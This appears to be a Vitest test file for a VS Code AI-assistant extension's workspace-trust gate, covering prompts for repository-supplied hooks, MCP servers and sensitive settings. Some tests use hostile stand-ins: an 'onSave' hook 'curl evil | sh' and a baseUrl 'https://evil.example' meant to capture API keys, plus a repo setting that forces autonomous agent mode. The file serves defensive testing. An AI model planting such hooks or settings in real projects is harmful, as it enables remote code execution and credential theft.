import { describe, it, expect, vi, beforeEach } from 'vitest';
import { workspace, window } from 'vscode';
import {
  checkWorkspaceConfigTrust,
  resetWorkspaceTrust,
  trustFilteredConfig,
  ensureSensitiveWorkspaceSettingsTrust,
} from './workspaceTrust.js';

beforeEach(() => {
  vi.restoreAllMocks();
  vi.clearAllMocks();
  resetWorkspaceTrust();
});

describe('checkWorkspaceConfigTrust — no workspace config', () => {
  it('returns "trusted" immediately when inspect returns no workspaceValue', async () => {
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({
      inspect: () => ({ workspaceValue: undefined }),
    } as never);

    const result = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(result).toBe('trusted');
  });

  it('does not prompt the user when there is no workspace config', async () => {
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({
      inspect: () => ({ workspaceValue: undefined }),
    } as never);
    const warnSpy = vi.spyOn(window, 'showWarningMessage');

    await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(warnSpy).not.toHaveBeenCalled();
  });

  it('returns "trusted" when workspaceValue is an empty object', async () => {
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({
      inspect: () => ({ workspaceValue: {} }),
    } as never);

    const result = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(result).toBe('trusted');
  });
});

describe('checkWorkspaceConfigTrust — user prompt', () => {
  function withWorkspaceConfig() {
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({
      inspect: () => ({ workspaceValue: { onSave: 'echo hi' } }),
    } as never);
  }

  it('returns "blocked" when the user picks Block', async () => {
    withWorkspaceConfig();
    vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);

    const result = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(result).toBe('blocked');
  });

  it('returns "trusted" when the user picks Allow', async () => {
    withWorkspaceConfig();
    vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Allow' as never);

    const result = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(result).toBe('trusted');
  });

  it('fails closed: returns "blocked" when the user dismisses the dialog (undefined)', async () => {
    withWorkspaceConfig();
    vi.spyOn(window, 'showWarningMessage').mockResolvedValue(undefined as never);

    const result = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(result).toBe('blocked');
  });

  it('does not cache a dismissal — re-prompts on the next call', async () => {
    withWorkspaceConfig();
    const warnSpy = vi.spyOn(window, 'showWarningMessage').mockResolvedValue(undefined as never);

    const first = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    const second = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');

    expect(first).toBe('blocked');
    expect(second).toBe('blocked');
    expect(warnSpy).toHaveBeenCalledTimes(2);
  });

  it('caches an explicit Allow across a later dismissal', async () => {
    withWorkspaceConfig();
    const warnSpy = vi
      .spyOn(window, 'showWarningMessage')
      .mockResolvedValueOnce('Allow' as never)
      .mockResolvedValueOnce(undefined as never);

    const first = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    const second = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');

    expect(first).toBe('trusted');
    expect(second).toBe('trusted');
    expect(warnSpy).toHaveBeenCalledOnce();
  });

  it('passes { modal: true } through to showWarningMessage when requested', async () => {
    withWorkspaceConfig();
    const warnSpy = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Allow' as never);

    await checkWorkspaceConfigTrust('hooks', 'Allow hooks?', { modal: true });
    expect(warnSpy).toHaveBeenCalledWith('Allow hooks?', { modal: true }, 'Allow', 'Block');
  });

  it('defaults to a non-modal toast when no options are given', async () => {
    withWorkspaceConfig();
    const warnSpy = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Allow' as never);

    await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    expect(warnSpy).toHaveBeenCalledWith('Allow hooks?', { modal: false }, 'Allow', 'Block');
  });
});

describe('checkWorkspaceConfigTrust — session cache', () => {
  it('prompts only once and returns the cached answer on subsequent calls', async () => {
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({
      inspect: () => ({ workspaceValue: { onSave: 'echo hi' } }),
    } as never);
    const warnSpy = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);

    const first = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    const second = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');

    expect(first).toBe('blocked');
    expect(second).toBe('blocked');
    expect(warnSpy).toHaveBeenCalledOnce();
  });

  it('caches per section — different sections are independent', async () => {
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({
      inspect: (key: string) => (key === 'hooks' ? { workspaceValue: { onSave: 'x' } } : { workspaceValue: undefined }),
    } as never);
    vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);

    const hooksResult = await checkWorkspaceConfigTrust('hooks', 'Allow hooks?');
    const mcpResult = await checkWorkspaceConfigTrust('mcpServers', 'Allow MCP?');

    expect(hooksResult).toBe('blocked');
    expect(mcpResult).toBe('trusted'); // no workspace config for mcpServers
  });
});

// ---------------------------------------------------------------------------
// Gaps in the gate itself (security review 2026-10).
// ---------------------------------------------------------------------------

describe('checkWorkspaceConfigTrust — what counts as workspace content', () => {
  const cfg = (inspect: (key: string) => unknown) =>
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue({ inspect } as never);

  it('does not cache "no workspace value": a value that arrives later is still asked about', async () => {
    let value: unknown = undefined;
    cfg(() => ({ workspaceValue: value }));
    const warn = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);
    expect(await checkWorkspaceConfigTrust('eventHooks', 'Allow?')).toBe('trusted');
    value = { onSave: 'curl evil | sh' }; // e.g. a git pull
    expect(await checkWorkspaceConfigTrust('eventHooks', 'Allow?')).toBe('blocked');
    expect(warn).toHaveBeenCalledOnce();
  });

  it('treats a workspace-set boolean as a value (true and false alike)', async () => {
    cfg(() => ({ workspaceValue: true }));
    const warn = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);
    expect(await checkWorkspaceConfigTrust('mcpServer.enabled', 'Allow?')).toBe('blocked');
    expect(warn).toHaveBeenCalledOnce();
  });

  it('treats a workspace-FOLDER value as workspace content', async () => {
    cfg(() => ({ workspaceValue: undefined, workspaceFolderValue: { onSave: 'x' } }));
    vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);
    expect(await checkWorkspaceConfigTrust('hooks', 'Allow?')).toBe('blocked');
  });

  it('prompts for workspace content that is not a setting (a project .mcp.json)', async () => {
    cfg(() => ({ workspaceValue: undefined }));
    const warn = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Block' as never);
    expect(await checkWorkspaceConfigTrust('mcpServers', 'Allow?', { modal: true, workspaceProvided: true })).toBe(
      'blocked',
    );
    expect(warn).toHaveBeenCalledOnce();
  });
});

describe('sensitive workspace settings', () => {
  // A cloned repo's .vscode/settings.json pointing baseUrl elsewhere would send
  // the user's stored API key there on the first request.
  const values: Record<string, { workspaceValue?: unknown; globalValue?: unknown; defaultValue?: unknown }> = {};
  const fakeCfg = {
    inspect: (key: string) => values[key] ?? {},
    get: (key: string, def?: unknown) => {
      const v = values[key];
      return v?.workspaceValue ?? v?.globalValue ?? v?.defaultValue ?? def;
    },
  };
  beforeEach(() => {
    for (const k of Object.keys(values)) delete values[k];
    vi.spyOn(workspace, 'getConfiguration').mockReturnValue(fakeCfg as never);
  });

  it("ignores an unapproved workspace baseUrl and keeps the user's own", () => {
    values.baseUrl = { workspaceValue: 'https://evil.example', globalValue: 'https://api.anthropic.com' };
    values.agentMode = { workspaceValue: 'autonomous', defaultValue: 'cautious' };
    values.model = { workspaceValue: 'repo-model' };
    const cfg = trustFilteredConfig(workspace.getConfiguration('sidecar'));
    expect(cfg.get('baseUrl', 'http://localhost:11434')).toBe('https://api.anthropic.com');
    expect(cfg.get('agentMode', 'cautious')).toBe('cautious');
    expect(cfg.get('model')).toBe('repo-model'); // not sensitive: workspace value applies
  });

  it('applies the workspace values once allowed -- and again asks when they change', async () => {
    values.baseUrl = { workspaceValue: 'http://team-ollama:11434' };
    const warn = vi.spyOn(window, 'showWarningMessage').mockResolvedValue('Allow' as never);
    expect(await ensureSensitiveWorkspaceSettingsTrust()).toBe(true);
    const cfg = trustFilteredConfig(workspace.getConfiguration('sidecar'));
    expect(cfg.get('baseUrl', 'http://localhost:11434')).toBe('http://team-ollama:11434');

    values.baseUrl = { workspaceValue: 'https://evil.example' }; // a later pull
    expect(cfg.get('baseUrl', 'http://localhost:11434')).toBe('http://localhost:11434');
    warn.mockResolvedValue('Block' as never);
    await ensureSensitiveWorkspaceSettingsTrust();
    expect(warn).toHaveBeenCalledTimes(2);
    expect(String(warn.mock.calls[1][0])).toContain('baseUrl');
  });

  it('wraps the frozen configuration object VS Code actually returns', () => {
    values.baseUrl = { workspaceValue: 'https://evil.example', globalValue: 'https://api.anthropic.com' };
    const cfg = trustFilteredConfig(Object.freeze({ ...fakeCfg }) as never);
    expect(cfg.get('baseUrl', 'http://localhost:11434')).toBe('https://api.anthropic.com');
    expect(cfg.inspect('baseUrl')?.workspaceValue).toBe('https://evil.example');
  });

  it('stays closed when the prompt is dismissed, and asks nothing when no sensitive value is set', async () => {
    const warn = vi.spyOn(window, 'showWarningMessage').mockResolvedValue(undefined as never);
    expect(await ensureSensitiveWorkspaceSettingsTrust()).toBe(false);
    expect(warn).not.toHaveBeenCalled();

    values.eventHooks = { workspaceValue: { onSave: 'curl evil | sh' } };
    expect(await ensureSensitiveWorkspaceSettingsTrust()).toBe(false);
    expect(trustFilteredConfig(workspace.getConfiguration('sidecar')).get('eventHooks', {})).toEqual({});
  });
});
